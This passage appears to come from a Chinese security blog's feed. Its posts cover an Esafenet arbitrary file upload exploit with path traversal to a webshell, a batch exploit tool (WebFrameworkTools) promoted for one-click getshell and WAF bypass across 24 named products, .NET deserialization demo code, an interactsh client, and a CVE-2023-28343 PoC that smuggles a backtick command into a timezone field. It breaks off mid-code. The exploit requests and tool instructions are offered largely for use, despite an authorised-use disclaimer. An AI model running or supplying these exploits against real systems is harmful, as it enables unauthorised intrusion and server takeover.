$url$#漏洞特征字符串包含这个字符串就有漏洞vulStr<span class="token operator">=</span>is vulnerable#正则表达式提取字符串regex<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">&lt;=</span>\<span class="token punctuation">[</span>\<span class="token operator">+</span>\<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>*#配置不输出程序执行的所有结果只输出正则结果等echoAllResult<span class="token operator">=</span>no#配置是否需要本程序写入结果writeFile<span class="token operator">=</span>yes#配置不包含这个字符串有漏洞注意vulStr和<span class="token class-name">NovulStr</span>不能同时出现在同一个配置文件中#<span class="token class-name">NovulStr</span></code></pre><p>我们测试一下看看。这个直接可以漏洞脚本和ini文件可以分别放置只需要配置就行了。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021441108.png" alt="5.2测试截图"><br>批量工具测试<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021444462.png"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>各种用法和软件公布时间见github。案例源代码:<a href="https://t.me/SoftwareNoticeChannel/265">https://t.me/SoftwareNoticeChannel/265</a></p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>亿赛通 电子文档安全管理系统 UploadFileFromClientServiceForClient 任意文件上传漏洞poc解析</title>
      <link href="/codeaudit/2023/09/articles/2d6e04e436b4b308/"/>
      <url>/codeaudit/2023/09/articles/2d6e04e436b4b308/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在写hw漏洞exp的时候在佩琪文库看到亿赛通的exp如下 </p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span><span class="token class-name">CDGServer3</span><span class="token operator">/</span><span class="token class-name">UploadFileFromClientServiceForClient</span><span class="token operator">?</span>AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv<span class="token operator">:</span><span class="token number">109.0</span><span class="token punctuation">)</span> <span class="token class-name">Gecko</span><span class="token operator">/</span><span class="token number">20100101</span> <span class="token class-name">Firefox</span><span class="token operator">/</span><span class="token number">113.0</span><span class="token class-name">Accept</span><span class="token operator">:</span> <span class="token operator">*</span><span class="token comment">/*Content-Length: 1Test</span></code></pre><p>其中的AFMAL这玩意看着是加密过得。于是乎我顺着个exp拿下了webshell然后对代码进行分析</p><h2 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h2><p>根据多年的代码审计经验得出下图。有的人说这是咋找到的。这玩意首先你的会javase。其次你得会javaee。然后你还得会代码审计。如果展开讲篇幅太长我们重点就分析下面的代码<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011850935.png" alt="漏洞点定位"><br>此代码有一个Constants.EQUAL 这个是个常量就是&#x3D;等于号。 例如我向提交<a href="https://www.baidu.com/?username=xxxxxxxxx">https://www.baidu.com?username=xxxxxxxxx</a> 。这句话的意思就是获取 xxxxxxxxx。你知道这个就行了。所以我们构造exp 的时候可以加上usernam这些参数也是可以的。然后调用 CDGUtil.decode() 函数进行解码<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011853393.png" alt="看下面的代码"><br>在往下看解密以后使用&amp;分割如果有filename开头的那么获取他的值继续看<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011857516.png" alt="filename"><br>然后发现使用File file &#x3D; new File(Constant.instance.UPLOAD_PATH + fileName);这个对文件进行保存没有过滤任何文件名称的特殊字符导致漏洞存在。至于这个Constant.instance.UPLOAD_PATH 是什么默认为 C:&#x2F;fileDB&#x2F;uploaded&#x2F; 这个得配置。我们的web目录在 C:\Program Files (x86)&#x2F;ESAFENET&#x2F;CDocGuard Server&#x2F;tomcat64&#x2F;webapps&#x2F;  所以我们得跳目录..&#x2F;..&#x2F;C:&#x2F;Program Files (x86)&#x2F;ESAFENET&#x2F;CDocGuard Server&#x2F;tomcat64&#x2F;webapps&#x2F;  如果是..&#x2F;..&#x2F;..&#x2F;那么就直接省略 就是这种了Program Files (x86)&#x2F;ESAFENET&#x2F;CDocGuard Server&#x2F;tomcat64&#x2F;webapps&#x2F;<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011858699.png" alt="漏洞点"></p><h2 id="解密exp构造自己的poc"><a href="#解密exp构造自己的poc" class="headerlink" title="解密exp构造自己的poc"></a>解密exp构造自己的poc</h2><p>我们知道原理以后直接搞一个项目开搞。对了还有这个代码 ServletInputStream inputStream &#x3D; req.getInputStream();<br>这就是接受请求数据的主要content-type 不是post默认的可以不填。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011903518.png" alt="解密exp"><br>我们在调用一下加密函数直接拿捏<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011905232.png" alt="构造成功"></p><h2 id="漏洞更新详情"><a href="#漏洞更新详情" class="headerlink" title="漏洞更新详情"></a>漏洞更新详情</h2><p>上述漏洞已经集成到我们的 WebFrameworkTools  直接一键getshell。更新hw漏洞详情<br>2023-09-01 更新了hw 中漏洞24个分别为用友nc cloud 上传漏洞 一键getshell,汉得SRM tomcat.jsp 文件存在登陆绕过漏洞,深信服 应用交付管理系统 login 远程命令执行漏洞(shell拿不到),网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞,用友 移动管理系统 uploadApk.do,HiKVISION 综合安防管理平台 env 信息泄漏漏洞,锐捷 NBR 路由器 fileupload.php 任意文件上传,金盘 微信管理平台 getsysteminfo 未授权访问,网御上网行为管理系统Sql注入,用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件上传漏洞,广联达sql注入,企望制造 ERP comboxstore.action 远程命令执行漏洞,大华 智慧园区综合管理平台 video 任意文件上传漏洞,大华城市安防监控系统平台管理存在任意文件下载漏洞,大华城市安防监控系统平台管理sql注入漏洞,飞企互联 FE业务协作平台 ShowImageServlet 任意文件读取漏洞,Metabase validate 远程命令执行漏洞 CVE-2023-38646(poc),大华 智慧园区综合管理平台 账号密码泄露,fficeweb365 任意文件上传漏洞,致远OA M1Server userTokenService 远程命令执行漏洞,金蝶OA 云星空 CommonFileServer 任意文件读取漏洞,新开普 前置服务管理平台 service.action 远程命令执行漏洞(勉强加上了),明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞,亿赛通文件上传漏洞。详情看截图2023hw漏洞。2023hw漏洞更新此次更新24个漏洞由于时间或者其他原因部分漏洞没有更新。这个不影响。我们软件新版本5.2功能可以调用任意脚本执行exp 弥补了这个不足这次更新以后我将不会再更新漏洞。后续我学习完毕以后将专注更新软件。感谢大家对软件的支持。其中这些漏洞的exp大部分我都做了变形以求绕过waf。所以写软件不光是速度还有准确度。还要有代码审计能力对于位公布的加密的exp可以解密实现自定义请求。<br>软件5.2效果测试截图。可以调用任意程序批量执行。具体看截图<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011915972.png" alt="5.2效果测试"><br>更新详情见 <a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main">https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011910280.png" alt="hw漏洞更新详情"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>实在是没时间要不hw的漏洞全部给他加到工具里面。有的漏洞已经修复了太难了😔。大家用工具的时候很爽在这背后作者我付出不少啊😂。有的大佬想破解或者逆向工具的。就算源代码给你。我更新和你更新出来的软件。肯定是我的软件比你的牛逼。所以多学习学习思路而不是老想破解得到源代码。思想无法复制。这也就是我们的软件不仅速度快而且误报率低的原因。与其破解不如后续你购买代码。我手把手教学来的实在。既不想花钱又想搞到成果。我劝你还是洗洗睡吧。因为逆向出的是代码不是学习思路只有思路才是王道😂。后续我学习完毕以后软件这块将重点抓一波。我以后也用毕竟。以后安全的发展方向。<br>现在各种防护设备。以后是代码审计的天下。框架审计的天下。好好布局吧。以后安全将变成 代码审计 二进制漏洞挖掘(内网渗透) 移动端 物联网端 越大朝硬件。朝代码层面发展。还没有学习编程语言的你要努力学习一门语言了💪💪。等博主学习完毕以后我们将着重更新我们的软件。让他变成流弊的软件</p>]]></content>
      
      
      <categories>
          
          <category> CodeAudit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeAuditExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合性exp|poc渗透工具-WebFrameworkTools5.0</title>
      <link href="/securitytools/2023/08/articles/17280a163317a771/"/>
      <url>/securitytools/2023/08/articles/17280a163317a771/</url>
      
        <content type="html"><![CDATA[<h1 id="软件介绍"><a href="#软件介绍" class="headerlink" title="软件介绍"></a>软件介绍</h1><h2>WebFrameworkTools-5.0 工具使用方法</h1>软件从去年停止以后就在没有发布过。由于各种原因吧。有的兄弟对源代码对工具感兴趣所以。我在恢复一下使用让购买源代码的或者工具的能更好的了解工具。此次公布的工具 url条数是500条。不检测代理 exp和poc大家随便抓。另外在内网环境下也是可以使用的。<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051859421.png" alt="软件界面"></p><h2 id="exp模式"><a href="#exp模式" class="headerlink" title="exp模式"></a>exp模式</h2><p>拿到软件 打开cmd.bat输入软件名称回车即可显示帮助我们跳一个长的来介绍一下。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051905594.png" alt="exp模式界面"><br>WebFrameworkTools.exe -url <a href="http://www.baidu.com/">http://www.baidu.com</a> -type thinkphp -thread 30 <br/><br>这个url的意思是你要 测试的目标网站这必须带https:&#x2F;&#x2F;或者http:&#x2F;&#x2F;   type指定的是这个网站开发框架和所属cms  thread 指定的线程数量是多少<br/></p><p>WebFrameworkTools.exe -url <a href="http://www.baidu.com/">http://www.baidu.com</a>  这个type和线程都不指定使用的就是全部type进行测试。线程使用程序自定义的线程。例子如下:</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051909886.png" alt="例子"></p><h2 id="dll模式"><a href="#dll模式" class="headerlink" title="dll模式"></a>dll模式</h2><p>如何进去dll模式 按照提示创建一个userdll.txt 文本即可进入dll模式。如果生成</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051912665.png" alt="dll模式"></p><h2 id="生成exp-dll"><a href="#生成exp-dll" class="headerlink" title="生成exp dll"></a>生成exp dll</h2><p>有一些网站exp比较简单所以我们可以直接使用生成dll的工具来生成dll然后使用软件加载dll进行测试网站的安全性接下来演示一下如何生成dll。来到生成dll这个工具的文件夹双击exe打开工具如下图</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051914696.png" alt="dll生成工具"><br>我们以百度网站为例讲解一下。加入你在poc或者get请求有一个echo STATUS OK 字符然后在影响包里面也存在这个关键字正常存在漏洞。构造如下图。点击生成利用的dll。确保Dllplugins.dll 和exe在同一个目录下。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051919001.png" alt="生成利用dll"><br>然后把testbaidu.dll和Dllplugins.dll 复制到WebFrameworkTools.exe 工具目录里面如下图<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051921424.png" alt="复制一下"><br>根据提示利用一下<br>WebFrameworkTools.exe -url <a href="http://www.baidu.com/">http://www.baidu.com</a> -dllname testbaidu.dll<br/><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051922064.png" alt="利用截图"><br>例如:<br>当然如果是url比较多那么创建一个url.txt 一行一个网站直接 指定dllname就行了<br>WebFrameworkToolsUser.exe -dllname testbaidu.dll -thread 30<br/><br>还有不会的请参考下面详细用法</p><h2 id="软件开发类型"><a href="#软件开发类型" class="headerlink" title="软件开发类型"></a>软件开发类型</h2> <ul> <li>  团队协作开发核心代码博主开发,是否原创:是 </li> </ul>    <h2 id="详细用法参见"><a href="#详细用法参见" class="headerlink" title="详细用法参见"></a>详细用法参见</h2> <ul> <li> https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main </li> <li> 视频教程地址:https://www.youtube.com/watch?v=zvIdx0GkZVY </li> </ul><h2 id="使用条例"><a href="#使用条例" class="headerlink" title="使用条例"></a>使用条例</h2><p>本项目发布软件禁止对未授权网站进行攻击<br/><br>本项目如果发布源代码禁止进行未授权商业用途<br/><br>本项目如果发布源代码禁止二次开发后对网站进行非法攻击<br/><br>本项目仅面向合法授权的企业安全建设行为，在使用本项目进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权<br/><br>如您在使用本项目的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任在使用本项目前，请您务必审慎阅读、充分理解各条款内容，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要使用本项目您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束<br/><br>下载软件即代表同意本使用条例!!!!。如果不同意请下载后直接删除本软件。</p><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.upload.ee/files/15539557/WebFrameworkTools-2022-08-26.zip.html">https://www.upload.ee/files/15539557/WebFrameworkTools-2022-08-26.zip.html</a> </p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github .net 反序列11课反序列化漏洞代码</title>
      <link href="/codeaudit/2023/07/articles/9c9b28d24e8ef1ac/"/>
      <url>/codeaudit/2023/07/articles/9c9b28d24e8ef1ac/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在一次项目中得到一波.net 源码。看到了一个函数内容可以是json数据于是乎使用json数据测试。测试的时候发现 json报错 发现有一个关键字JavaScriptSerializer 立马搜索了一波。这玩意可以反序列。于是乎我用ysoserial.exe 生成poc 本以为要和java一样起飞了结果。握擦 报错了。type参数不能为null 这net反序列化漏洞之前没有遇到过。以为是姿势有问题。网上搜索了一波看到github这里<a href="https://github.com/Ivan1ee/NET-Deserialize">https://github.com/Ivan1ee/NET-Deserialize</a> 有介绍。由于没有学过看看。他这个项目没有漏洞代码。于是我自己花时间写了一个漏洞demo。打了一波发现沃日。。这玩意得满足一定条件才行要不就是报type 参数为null。搞了半天是没有反序列化漏洞啊。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308041542668.png" alt="没漏洞的截图"></p><h2 id="补全漏洞代码"><a href="#补全漏洞代码" class="headerlink" title="补全漏洞代码"></a>补全漏洞代码</h2><p>于是乎本着送佛送到西我把这个github所涉及的11个反序列化的pdf的案例都写成了漏洞代码这到时候就省事了到底是没有漏洞还是链不行。如下图<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308041545382.png" alt="漏洞代码"></p><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>频道地址<br><a href="https://t.me/SoftwareNoticeChannel/243">https://t.me/SoftwareNoticeChannel/243</a></p>]]></content>
      
      
      <categories>
          
          <category> CodeAudit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeAuditExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>interactsh-collaborator 源码分析用.net写一个客户端</title>
      <link href="/penetrationtest/2023/07/articles/05d020ff2fca8938/"/>
      <url>/penetrationtest/2023/07/articles/05d020ff2fca8938/</url>
      
        <content type="html"><![CDATA[<h2 id="brup插件"><a href="#brup插件" class="headerlink" title="brup插件"></a>brup插件</h2><p>这是 Interact.sh 的 Burpsuite 插件<br>该插件实现了interactsh-client 的客户端逻辑。 它将允许您生成可用于 OOB 测试的新域。 如果您托管自己的 Interactsh 版本，则可以在“配置”选项卡中对其进行配置。此扩展可与 Burpsuite 的 Collaborator 服务一起使用。加载扩展后，所有结果都会记录在 Interactsh 日志选项卡中。 记录并选择 OOB 交互后，详细信息将显示在底部窗口中。<br>github地址：<a href="https://github.com/wdahlenburg/interactsh-collaborator">https://github.com/wdahlenburg/interactsh-collaborator</a> 这个插件已经很久没有更新了</p><h2 id="插件不足"><a href="#插件不足" class="headerlink" title="插件不足"></a>插件不足</h2><p>1:没有清理日志功能,目标多了无法判断是否存在漏洞<br/><br>2:只能是一个域名,频繁请求会超时<br/><br>3:ping命令测试没有回显造成ping命令测试的漏洞全部遗漏<br/><br>4:源代码中域名已经废弃不修改直接启动客户端失败<br/><br>github出现的问题截图<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221254357.png" alt="出现的问题"></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>手下去github下载源代码。在github issue 中我们看到注册客户端的时候会报错从代码角度看一下。估计是这里的问题这里面的域名过时了可以换成我这里写的域名然后进行编译。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221256429.png" alt="更改域名"><br>编译以后如何使用。这里oast.pro 配置你自己的域名或者使用官方提供的域名<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221258692.png" alt="配置域名"><br>然后来到logs 点击生成url 然后进行测试就行了。我们刚才是说了如何使用接下来我们就开始分析一下代码。在BurpExtender 这类中是插件的入口点<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221302191.png" alt="如下图"><br>来到InteractshListener 这是生成 测试域名的url<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221305456.png"><br>1:我们看注册客户端的代码<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221307192.png" alt="注册客户端代码"><br>生成公钥并且转成pem格式的。并且用base64把公钥进行编码<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221308253.png" alt="生成公钥"><br>然后这些发送到服务器端使用json数据。至于如何生成这些东西的代码我就不分析了。我们主要看他这个软件的逻辑。</p><pre class="language-java" data-language="java"><code class="language-java">registerData<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"public-key"</span><span class="token punctuation">,</span> pubKey<span class="token punctuation">)</span><span class="token punctuation">;</span>registerData<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"secret-key"</span><span class="token punctuation">,</span> secretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>registerData<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"correlation-id"</span><span class="token punctuation">,</span> correlationId<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>2:循环等待请求服务端获取数据代码。如果获取到数据那么</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">while</span> <span class="token punctuation">(</span>running <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>c<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token class-name">TimeUnit</span><span class="token punctuation">.</span>SECONDS<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">burp<span class="token punctuation">.</span></span>BurpExtender</span><span class="token punctuation">.</span>pollTime<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//休眠时间你设置的的</span><span class="token punctuation">&#125;</span></code></pre><p>3:使用私钥把aes加密出来,在使用aeskey 解密data 属性的加密数据。至于什么填充方式和什么的我就不分析了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221315033.png" alt="解密数据"><br>4:解密出来然后在 burp插件上面展示出来。这个如果用java写客户端直接copy代码就行了直接就写完了。我们使用.net来写总所周知java和net 字节数组不一样所以造成了这难度比较大。我在chatGpt和谷歌和百度和自己的理解调整的情况下终于编写出我们的客户端</p><h2 id="net-客户端"><a href="#net-客户端" class="headerlink" title=".net 客户端"></a>.net 客户端</h2><p>下载地址:<a href="https://github.com/peiqiF4ck/interactshCsharpclient">https://github.com/peiqiF4ck/interactshCsharpclient</a><br/><br>后续我们将把这个探测方式加入我们的webframeworktools里面。nuclei探测有我们也要加入一下。基本上上面提的问题我们全部用这个解决了。由于burp插件编写我不熟悉这个是主要的另外我们的工具也要用这个。我在github中找没有.net写的插件。所以我干脆自己写一个客户端了。</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307212249255.gif" alt="演示截图"></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Altenergy Power System Control命令执行漏洞(CVE-2023-28343)复现</title>
      <link href="/penetrationtest/2023/07/articles/a67e92b61df29d7e/"/>
      <url>/penetrationtest/2023/07/articles/a67e92b61df29d7e/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看公众号发现有个漏洞CVE-2023-28343  发了一个poc是 timezone&#x3D;<code>nslookup www.dnslog.cn</code> 我寻思这玩意难道就是回显不了的才能。于是我找国外网站进行复现。拿到了shell并且把代码打包了一份。下载下来仔细研究了一下这套系统是基于mvc开发的。发现了漏洞点。我尝试构造回显。构造成功尝试构造写shell的exp构造成功。我看到某些文章咔咔一顿发。跟风大部分都是这个poc。。。于是乎有了这篇文章。我看github老外也是是反弹shell的。我们能直接getshell 绝不反弹shell。</p><p>poc </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">/</span>management<span class="token operator">/</span>set_timezone <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows <span class="token constant">NT</span> <span class="token number">5.1</span><span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">35.0</span><span class="token number">.2309</span><span class="token number">.372</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>Connection<span class="token punctuation">:</span> closeContent<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">62</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflateContent<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token punctuation">;</span> charset<span class="token operator">=</span><span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span>Referer<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/index.php/management/datetime</span><span class="token constant">X</span><span class="token operator">-</span>Requested<span class="token operator">-</span>With<span class="token punctuation">:</span> XMLHttpRequesttimezone<span class="token operator">=</span><span class="token string backtick-quoted-string">`nslookup dns`</span></code></pre><h2 id="漏洞起因"><a href="#漏洞起因" class="headerlink" title="漏洞起因"></a>漏洞起因</h2><p>漏洞文件：home\local_web\pages\application\controllers\management.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">set_timezone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//漏洞函数</span><span class="token punctuation">&#123;</span>      <span class="token variable">$results</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">management_model</span><span class="token operator">-></span><span class="token function">set_timezone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//漏洞点</span>    <span class="token variable">$results</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"message"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lang</span><span class="token operator">-></span><span class="token function">line</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"timezone_result_&#123;$results["</span>value<span class="token string double-quoted-string">"]&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$results</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>继续追踪代码<br>\home\local_web\pages\application\models\management_model.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">/* 设置时区 */</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">set_timezone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>       <span class="token variable">$results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//获取页面选择的时区 </span>       <span class="token variable">$timezone</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">input</span><span class="token operator">-></span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'timezone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//可控点</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$timezone</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>       <span class="token variable">$timezone</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Asia/Taipei"</span><span class="token punctuation">;</span>       <span class="token comment">//设置linux系统时区</span>       <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"cp /usr/share/zoneinfo/<span class="token interpolation"><span class="token variable">$timezone</span></span> /etc/localtime"</span><span class="token punctuation">;</span> <span class="token comment">//漏洞点</span>       <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//漏洞触发点</span>       <span class="token comment">//将时区保存到配置文件</span>       <span class="token variable">$fp</span> <span class="token operator">=</span> @<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/etc/yuneng/timezone.conf"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$timezone</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token comment">//计算ECU本地时间并存入时钟芯片</span>       <span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token variable">$timezone</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$localtime_assoc</span> <span class="token operator">=</span> <span class="token function">localtime</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$local_time</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%04d%02d%02d%02d%02d%02d"</span><span class="token punctuation">,</span>                           <span class="token variable">$localtime_assoc</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tm_year'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1900</span><span class="token punctuation">,</span>                           <span class="token variable">$localtime_assoc</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tm_mon'</span><span class="token 